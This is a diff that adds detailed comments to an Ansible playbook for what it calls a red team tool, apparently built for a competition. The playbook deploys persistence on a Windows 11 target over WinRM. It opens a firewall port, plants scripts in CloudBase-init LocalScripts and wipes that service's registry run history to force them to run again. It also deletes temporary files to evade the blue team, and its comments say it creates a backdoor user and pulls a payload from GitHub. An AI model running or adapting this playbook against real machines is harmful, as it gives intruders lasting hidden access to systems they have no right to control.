@@ -1,7 +1,33 @@
+# deploy.yml
+
+# Main Ansible playbook for the CDT Red Team Tool.
+# Connects to a Windows 11 target over WinRM and deploys all persistence
+# mechanisms in the correct order. Designed to be run from the Kali machine
+# via deploy.sh which handles inventory updates and C2 server startup
+# before calling this playbook.
+#
+# Usage:
+#   ansible-playbook deploy.yml -i inventory.ini
+#
+# What this playbook does in order:
+#   1. Ensures WinRM HTTPS is configured for future Ansible connections
+#   2. Drops persistence scripts into CloudBase-init LocalScripts
+#   3. Clears CloudBase-init run history so scripts execute immediately
+#   4. Restarts CloudBase-init to trigger script execution
+#   5. Waits for CloudBase-init to finish running all scripts
+
 - name: Deploy Red Team Persistence
   hosts: target_windows
 
   tasks:
+
+    # ── Task 1: Configure WinRM HTTPS ────────────────────────────────────────
+    # Ansible initially connects over basic HTTP WinRM which was enabled by
+    # the one-liner run on the Windows machine. This task upgrades the
+    # connection to HTTPS by creating a self-signed certificate and binding
+    # it to a new HTTPS listener on port 5986. Checks first if an HTTPS
+    # listener already exists to avoid creating duplicates on repeat runs.
+    # After this task runs, all future Ansible connections use encrypted HTTPS.
     - name: Configure WinRM HTTPS listener via Ansible
       win_shell: |
         $existing = winrm enumerate winrm/config/Listener 2>$null | Select-String "HTTPS"
@@ -11,32 +37,74 @@
             netsh advfirewall firewall add rule name="WinRM HTTPS" dir=in action=allow protocol=TCP localport=5986
         }    
     
+    # ── Task 2: Drop WinRM maintenance script ────────────────────────────────
+    # Copies winrm_setup.ps1 from the local files/ directory on Kali into
+    # CloudBase-init's LocalScripts directory on the target. Prefixed with 01_
+    # so it runs before bootstrap.ps1 when CloudBase-init executes scripts
+    # alphabetically. This script re-configures WinRM HTTPS on every
+    # CloudBase-init run ensuring WinRM stays available even after reboots
+    # or if blue team attempts to disable it.
     - name: Drop WinRM setup script into CloudBase-init LocalScripts
       win_copy:
         src: files/winrm_setup.ps1
         dest: "C:\\Program Files\\Cloudbase Solutions\\Cloudbase-Init\\LocalScripts\\01_winrm_setup.ps1"
 
+    # ── Task 3: Process bootstrap template ───────────────────────────────────
+    # win_template processes bootstrap.ps1.j2 as a Jinja2 template, injecting
+    # any {{ variables }} from vault.yml or the playbook vars before writing
+    # the result to a temp location on the target. This is done in two steps
+    # because win_template writes to a destination path on the target but we
+    # need the file to end up in a protected system directory which requires
+    # the intermediate copy approach used in Task 4.
     - name: Template bootstrap script with secrets injected
       win_template:
         src: templates/bootstrap.ps1.j2
         dest: "C:\\Windows\\Temp\\bootstrap.ps1"
 
+    # ── Task 4: Move bootstrap to LocalScripts ───────────────────────────────
+    # Copies the processed bootstrap.ps1 from the temp location into
+    # CloudBase-init's LocalScripts directory. remote_src: yes tells Ansible
+    # the source file is already on the remote machine rather than on Kali.
+    # Prefixed with 02_ (no number prefix here but runs after 01_winrm_setup.ps1
+    # alphabetically) so WinRM is guaranteed to be configured before bootstrap
+    # attempts to run. This is the main persistence script that creates the
+    # backdoor user and pulls payload.ps1 from GitHub.
     - name: Move bootstrap to CloudBase-init LocalScripts
       win_copy:
         src: "C:\\Windows\\Temp\\bootstrap.ps1"
         remote_src: yes
         dest: "C:\\Program Files\\Cloudbase Solutions\\Cloudbase-Init\\LocalScripts\\bootstrap.ps1"
 
+    # ── Task 5: Clean up temp file ────────────────────────────────────────────
+    # Deletes the intermediate bootstrap.ps1 from C:\Windows\Temp now that
+    # it has been copied to LocalScripts. state: absent tells Ansible to
+    # ensure the file does not exist, deleting it if it does. Reduces
+    # forensic artifacts that blue team could use to detect our activity.
     - name: Clean up temp bootstrap copy
       win_file:
         path: "C:\\Windows\\Temp\\bootstrap.ps1"
         state: absent
 
+    # ── Task 6: Stop CloudBase-init ───────────────────────────────────────────
+    # Stops the CloudBase-init service before clearing the registry. This
+    # order is important — stopping first ensures the service is not running
+    # while we modify its registry entries, preventing a race condition where
+    # the service could recreate the keys as we delete them.
     - name: Stop CloudBase-init service
       win_service:
         name: cloudbase-init
         state: stopped
 
+    # ── Task 7: Clear run history registry keys ───────────────────────────────
+    # CloudBase-init tracks which plugins have already executed by writing
+    # GUID keys under HKLM:\SOFTWARE\Cloudbase Solutions\Cloudbase-Init.
+    # When these keys exist it skips those plugins on subsequent runs,
+    # which would prevent our LocalScripts from executing. Deleting these
+    # keys tricks CloudBase-init into treating the next start as a first
+    # run, causing it to execute all plugins including LocalScriptsPlugin
+    # which runs our dropped scripts. Get-ChildItem lists all subkeys and
+    # ForEach-Object pipes each one to Remove-Item with -Recurse -Force
+    # to delete them and any nested keys without prompting.
     - name: Clear CloudBase-init run history so plugins execute again
       win_shell: |
         $path = "HKLM:\SOFTWARE\Cloudbase Solutions\Cloudbase-Init"
@@ -45,6 +113,12 @@
         }
         Write-Host "Registry cleared"
 
+    # ── Task 8: Verify registry was cleared ───────────────────────────────────
+    # Confirmation step that checks whether the registry keys were actually
+    # deleted. Get-ChildItem on the CloudBase-init registry path returns
+    # nothing if all subkeys were removed. If keys are still present it
+    # prints their names so the operator can diagnose why deletion failed.
+    # This task does not stop the playbook if keys remain — it only reports.
     - name: Verify registry was cleared
       win_shell: |
         $path = "HKLM:\SOFTWARE\Cloudbase Solutions\Cloudbase-Init"
@@ -56,14 +130,36 @@
             Write-Host "SUCCESS: Registry is clear"
         }
 
+    # ── Task 9: Start CloudBase-init ──────────────────────────────────────────
+    # Starts the CloudBase-init service which immediately begins executing
+    # all configured plugins including LocalScriptsPlugin. With the registry
+    # cleared in Task 7, it treats this as a first run and executes every
+    # script in the LocalScripts directory in alphabetical order:
+    #   01_winrm_setup.ps1 → ensures WinRM HTTPS stays configured
+    #   bootstrap.ps1      → creates backdoor user and pulls payload.ps1
+    # CloudBase-init will stop itself automatically after all plugins finish.
     - name: Start CloudBase-init to trigger LocalScripts execution
       win_service:
         name: cloudbase-init
         state: started
 
+    # ── Task 10: Wait for CloudBase-init to finish ────────────────────────────
+    # Pauses the playbook for 45 seconds to give CloudBase-init time to
+    # finish executing all LocalScripts before the playbook ends. This is
+    # necessary because CloudBase-init runs scripts asynchronously after
+    # the service starts. Without this pause the playbook would complete
+    # before bootstrap.ps1 has finished running, making it appear as though
+    # the deployment succeeded when scripts may still be mid-execution.
     - name: Wait for CloudBase-init to finish running scripts
       pause:
         seconds: 45
 
+    # ── Task 11: Confirmation check (disabled) ────────────────────────────────
+    # Originally used during testing to verify bootstrap.ps1 ran successfully
+    # by checking the LastWriteTime of proof.txt. Commented out for competition
+    # use since the file may not exist if proof.txt creation was removed from
+    # bootstrap.ps1, which would cause the playbook to fail with a non-zero
+    # return code. Can be re-enabled during testing by removing the comment
+    # characters.
     # - name: Confirm bootstrap ran successfully
     #   win_shell: "Get-Item C:\\Users\\Public\\proof.txt | Select-Object LastWriteTime"
